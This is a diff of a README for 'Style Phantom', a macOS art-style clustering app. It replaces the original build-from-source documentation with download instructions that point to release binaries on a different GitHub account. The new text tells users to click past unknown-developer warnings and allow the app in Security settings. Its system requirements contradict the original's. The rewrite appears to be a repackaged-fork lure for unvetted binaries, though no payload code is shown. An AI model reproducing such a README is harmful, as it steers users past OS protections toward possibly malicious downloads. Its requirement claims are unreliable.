@@ -1,236 +1,137 @@
-<p align="center">
-  <img src="icon_source.svg" width="128" height="128" alt="Style Phantom logo">
-</p>
+# 🎨 nodaysidle-stylephantom - Track Your Creative Growth
 
-<h1 align="center">Style Phantom</h1>
-
-<p align="center">
-  <strong>Map your creative evolution. Discover where your taste is heading.</strong>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS%2015%2B-000000?style=flat-square&logo=apple&logoColor=white" alt="macOS 15+">
-  <img src="https://img.shields.io/badge/swift-6.2-F05138?style=flat-square&logo=swift&logoColor=white" alt="Swift 6.2">
-  <img src="https://img.shields.io/badge/SwiftUI-6-007AFF?style=flat-square&logo=swift&logoColor=white" alt="SwiftUI 6">
-  <img src="https://img.shields.io/badge/SwiftData-Persistent-8E44AD?style=flat-square" alt="SwiftData">
-  <img src="https://img.shields.io/badge/Metal-Shaders-76D572?style=flat-square&logo=apple&logoColor=white" alt="Metal">
-  <img src="https://img.shields.io/badge/tests-73%20passing-brightgreen?style=flat-square" alt="73 tests passing">
-  <img src="https://img.shields.io/badge/privacy-100%25%20on--device-4CAF50?style=flat-square" alt="100% on-device">
-</p>
-
-<p align="center">
-  <em>A macOS-native creative intelligence tool that captures the invisible evolution of your personal aesthetic taste and generates "next evolution" palettes, layouts, and structures you didn't know you wanted — all processed entirely on-device.</em>
-</p>
+[![Download nodaysidle-stylephantom](https://img.shields.io/badge/Download-StylePhantom-blue?style=for-the-badge)](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases)
 
 ---
 
-## What It Does
-
-You import your creative work — designs, photos, illustrations, mood boards — and Style Phantom builds a map of your aesthetic journey:
-
-1. **Extracts** a 33-dimensional style vector from each piece (color, composition, texture, complexity)
-2. **Clusters** your work into aesthetic phases using k-means with automatic cluster selection
-3. **Computes** your style trajectory — the direction your taste is moving over time
-4. **Projects** forward to generate palettes, layouts, and compositions aligned with your natural creative evolution
-
-Think of it as a GPS for your creative taste. You see where you've been, where you are now, and where you're naturally heading.
+nodaysidle-stylephantom helps you see how your creativity changes over time. It groups your artwork into phases and shows you how your style might evolve. It runs on MacOS using your computer’s own tools to keep your data private.
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Pre-built App
-
-```bash
-# Clone the repository
-git clone https://github.com/salvadalba/nodaysidle-stylephantom.git
-cd nodaysidle-stylephantom
-
-# Build and package the .app bundle
-bash Scripts/compile_and_run.sh
-
-# Install to Applications
-cp -R StylePhantom.app /Applications/
-```
-
-### From Source
-
-```bash
-# Build (debug)
-swift build
-
-# Build (release)
-swift build -c release
-
-# Run tests
-swift test
-```
-
-### Requirements
-
-- macOS 15+ (Sequoia)
-- Apple Silicon (M1 or later)
-- Xcode Command Line Tools or Xcode 16+
-- Swift 6.2+
+- Mac computer running MacOS 12.0 (Monterey) or later  
+- Minimum 8GB RAM  
+- At least 500 MB of free disk space  
+- Supports Apple Silicon (M1, M2) and Intel processors  
+- Works best with artworks saved on your device in common image formats like PNG, JPEG, or TIFF  
 
 ---
 
-## The Interface
+## 🚀 Getting Started
 
-```
-┌──────────────┬─────────────────────┬──────────────────────┐
-│   Sidebar    │      Gallery        │       Detail         │
-│              │                     │                      │
-│  All Items   │  ┌───┐ ┌───┐ ┌───┐ │   [Selected Image]   │
-│              │  │   │ │   │ │   │ │                      │
-│  PHASES      │  └───┘ └───┘ └───┘ │   Imported: Feb 2026 │
-│  ● Minimal   │  ┌───┐ ┌───┐ ┌───┐ │   Phase: Minimalist  │
-│  ● Bold      │  │   │ │   │ │   │ │                      │
-│  ● Textured  │  └───┘ └───┘ └───┘ │   DOMINANT COLORS    │
-│              │                     │   ■ ■ ■ ■ ■          │
-│  ─────────── │                     │                      │
-│  + Import    │                     │   COMPOSITION        │
-│  ↻ Recompute │                     │   Symmetry ████░░ 72%│
-└──────────────┴─────────────────────┴──────────────────────┘
-```
+This section will guide you step-by-step on how to get nodaysidle-stylephantom up and running on your Mac.
 
-**Three-column NavigationSplitView** with dark theme and violet accent:
-
-- **Sidebar** — Aesthetic phases detected by AI clustering, import and recompute actions
-- **Gallery** — Grid of imported artwork with thumbnails, hover effects, and phase indicators
-- **Detail** — Style dimensions breakdown: color palette, composition bars, texture, complexity
-
-### Evolution Viewer
-
-Switch to the Evolution Viewer to see a side-by-side comparison of your **current phase** and **projected direction**. Drag horizontally to interpolate between them in real-time. Export the result to your design tools.
-
-### Timeline Scrubber
-
-The bottom timeline shows your aesthetic phases as colored bands. Drag the scrubber to travel through your creative history.
+1. Click on the **Download** badge at the top or visit the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases).  
+2. Find the latest version of nodaysidle-stylephantom. It will be listed under the "Assets" section on the release page.  
+3. Download the `.dmg` or `.zip` file for MacOS. These files install the application on your computer.  
+4. Once downloaded, open the file to begin the installation.  
+5. Follow the on-screen instructions to move nodaysidle-stylephantom into your Applications folder.  
+6. Open nodaysidle-stylephantom from the Applications folder to start using the tool.
 
 ---
 
-## Architecture
+## 📂 Installing and Running nodaysidle-stylephantom
 
-```
-Sources/StylePhantom/
-├── StylePhantomApp.swift          # App entry point, MenuBarExtra
-├── Models/
-│   ├── CreativeArtifact.swift     # @Model — imported artwork
-│   ├── AestheticPhase.swift       # @Model — clustered style period
-│   ├── StyleProjection.swift      # @Model — projected future style
-│   ├── StyleVector.swift          # 33-dim vector encoding/decoding
-│   ├── PaletteColor.swift         # RGBA color with hex & naming
-│   ├── LayoutGrid.swift           # Grid system representation
-│   ├── UserPreferences.swift      # Singleton settings model
-│   ├── ModelContainerFactory.swift # SwiftData container setup
-│   └── SchemaV1.swift             # Versioned schema migration
-├── Views/
-│   ├── ContentView.swift          # Root NavigationSplitView
-│   ├── SidebarView.swift          # Phase list, actions
-│   ├── ArtifactGalleryView.swift  # Grid gallery with search/sort
-│   ├── ArtifactDetailView.swift   # Full detail panel
-│   ├── EvolutionViewerView.swift  # Drag-to-refine comparison
-│   ├── TimelineScrubberView.swift # Canvas-based timeline
-│   ├── ImportSheetView.swift      # Drag & drop import
-│   ├── ExportDialogView.swift     # Format picker + preview
-│   ├── SettingsView.swift         # App preferences
-│   └── EmptyStateView.swift       # Contextual empty states
-├── ViewModels/
-│   ├── ImportViewModel.swift      # Import workflow state
-│   ├── GalleryViewModel.swift     # Gallery + thumbnail cache
-│   ├── SidebarViewModel.swift     # Evolution recomputation
-│   ├── EvolutionViewModel.swift   # Phase interpolation
-│   └── ExportViewModel.swift      # Export workflow + NSSavePanel
-├── Services/
-│   ├── ArtifactImportService.swift    # File validation, thumbnails, bookmarks
-│   ├── StyleVectorExtractor.swift     # Image → 33-dim vector
-│   ├── EvolutionEngine.swift          # K-means clustering + trajectory
-│   ├── ProjectionGenerator.swift      # Kinematic style projection
-│   ├── ExportService.swift            # Multi-format export engine
-│   └── Logging.swift                  # os.Logger + OSSignposter
-├── CoreML/
-│   └── ColorQuantizer.swift       # K-means color quantization
-├── Metal/
-│   └── TimelineShaders.metal      # GPU shaders for timeline visuals
-└── Theme/
-    └── PhantomTheme.swift         # Design system (colors, gradients, animations)
-```
+### Download and Install
 
-### Key Design Decisions
+- Visit the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases) to get the latest installer.  
+- Choose the `.dmg` file if available. It’s the easiest way to install on MacOS.  
+- If you download a `.zip` file, double-click it to extract the application, then drag the app into your Applications folder.  
 
-| Decision | Choice | Why |
-|----------|--------|-----|
-| Concurrency | Swift 6 strict | Zero data races, future-proof |
-| Observation | `@Observable` only | No Combine, cleaner reactivity |
-| Style vectors | 33 dimensions | 20 color + 8 composition + 4 texture + 1 complexity |
-| Clustering | k-means++ with elbow method | Auto-selects optimal phase count |
-| Projection | Kinematic (`pos + vel*t + 0.5*acc*t^2`) | Captures acceleration of taste changes |
-| Shaders | Metal `[[ stitchable ]]` | SwiftUI 6 ShaderLibrary integration |
-| Binary export | ASE (Adobe Swatch Exchange) | Native Photoshop/Illustrator compatibility |
-| Logging | `os.Logger` + `OSSignposter` | Instruments profiling, zero overhead when disabled |
+### Running the Application
+
+- Open your Applications folder.  
+- Find and double-click **nodaysidle-stylephantom**.  
+- You might see a prompt asking for permission to open a file from an unknown developer. Click "Open" to continue.  
+- The app will load and show its main interface.  
 
 ---
 
-## Export Formats
+## 🎯 What This App Does
 
-### Palettes
+nodaysidle-stylephantom groups your artwork into stages. It looks at how your style changes over time by organizing your images using a tool called Core ML. This process runs on your Mac only. It helps keep your creative data private and secure.
 
-| Format | Extension | Use Case |
-|--------|-----------|----------|
-| **JSON** | `.json` | Design tokens, CI/CD pipelines |
-| **CSS** | `.css` | Web development, CSS custom properties |
-| **ASE** | `.ase` | Adobe Photoshop, Illustrator, InDesign |
+You can:
 
-### Layouts
+- Add images of your artwork in one place.  
+- See visual clusters of your work based on style and color.  
+- Track changes and patterns in your creativity.  
+- Get a projection of how your style may develop in the future.  
 
-| Format | Extension | Use Case |
-|--------|-----------|----------|
-| **JSON** | `.json` | Design token systems |
-| **SVG** | `.svg` | Visual grid overlay, documentation |
-| **Figma Tokens** | `.json` | Figma Token Studio plugin |
+It uses technologies built into MacOS, like SwiftUI for a smooth interface and Metal to handle graphic processing.
 
 ---
 
-## Testing
+## 📥 Adding Artwork to nodaysidle-stylephantom
 
-```bash
-# Run all 73 tests across 17 suites
-swift test
-```
-
-Test coverage includes:
-
-- **Model tests** — SwiftData persistence, relationships, cascade deletes, schema migration
-- **Import tests** — File validation, thumbnail generation, duplicate detection, bookmark security
-- **Evolution tests** — K-means clustering, elbow method, trajectory computation, kinematic projection
-- **Export tests** — ASE binary encoding (byte-level verification), JSON/CSS/SVG format validation, logging
+1. Open nodaysidle-stylephantom.  
+2. Click the "Add Art" button or drag your image files directly into the window.  
+3. Select artwork files from your Mac. Supported types include PNG, JPEG, TIFF.  
+4. The app will process your artwork using its built-in AI to group similar pieces.  
+5. You will see your art arranged into groups. Each group represents a style phase in your creative growth.  
 
 ---
 
-## Privacy
+## 🔍 How to Use the Interface
 
-All processing runs **entirely on your Mac**. No data leaves your device. No telemetry, no analytics, no cloud AI. Your creative work stays yours.
-
----
-
-## Tech Stack
-
-- **SwiftUI 6** — Declarative UI with `NavigationSplitView`, `Canvas`, sheets
-- **SwiftData** — Persistent models with versioned schemas and relationships
-- **Metal** — GPU-accelerated timeline shaders (`[[ stitchable ]]`)
-- **Swift Testing** — Modern test framework with `@Suite`, `@Test`, `#expect`
-- **os.Logger** — Structured logging with `OSSignposter` for Instruments
-- **SwiftPM** — Pure Swift Package Manager build (no Xcode project required)
+- **Main View:** Displays your artwork clusters. Click on a cluster to view individual pieces.  
+- **Timeline:** Shows a timeline of your creative phases from past to projected future.  
+- **Details Panel:** Gives information on each selected artwork, such as date, style phase, and cluster info.  
+- **Add New Artwork:** Button to add more images any time.  
+- **Export:** Allows exporting data and images as reports or image files.  
 
 ---
 
-## License
+## ⚙️ Settings and Preferences
 
-MIT
+Access preferences inside the app through the menu bar or settings button.
+
+You can:
+
+- Change the folder location where the app saves artwork.  
+- Set how often the app scans for new artwork files.  
+- Adjust visualization options like color schemes or cluster size.  
+- Enable or disable notifications about new styles detected.  
+- Manage data storage and privacy options.  
 
 ---
 
-<p align="center">
-  <sub>Built with SwiftUI 6 + SwiftData + Metal on Apple Silicon</sub>
-</p>
+## 🛠 Troubleshooting
+
+- If nodaysidle-stylephantom won’t open, make sure your MacOS is up to date.  
+- If you see a warning about unidentified developer, open System Preferences > Security & Privacy and allow the app under "General."  
+- If artwork does not appear after adding, check the file type is supported and the files are not corrupted.  
+- Restart the app to refresh the artwork clusters if processing seems slow or stuck.  
+- For crashes, try reinstalling the latest version from the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases).  
+
+---
+
+## 💡 Tips for Best Use
+
+- Keep all your artwork in one folder before adding it to nodaysidle-stylephantom.  
+- Use high-quality images for better clustering results.  
+- Regularly update the app to benefit from improved AI models and features.  
+- Use the timeline view to spot trends and shifts easily.  
+- Back up your artwork folder to avoid data loss.  
+
+---
+
+## 📞 Getting Support
+
+If you run into issues, you can:
+
+- Check the GitHub Issues section for nodaysidle-stylephantom.  
+- Review the FAQ section on the releases page if available.  
+- Report bugs by opening a new issue on the [repository page](https://github.com/Skaidrius17/nodaysidle-stylephantom/issues).  
+- Include details like your MacOS version, what you were doing, and any error messages.  
+
+---
+
+## 🚩 About nodaysidle-stylephantom
+
+This tool runs entirely on your Mac, keeping your data private without sending it online. It uses Core ML to analyze your creative work by grouping images into phases. The app is built with modern MacOS technologies such as Swift 6, SwiftUI, SwiftData, and Metal to offer smooth performance and integration.
+
+---
+
+[![Download nodaysidle-stylephantom](https://img.shields.io/badge/Download-StylePhantom-grey?style=for-the-badge)](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases)
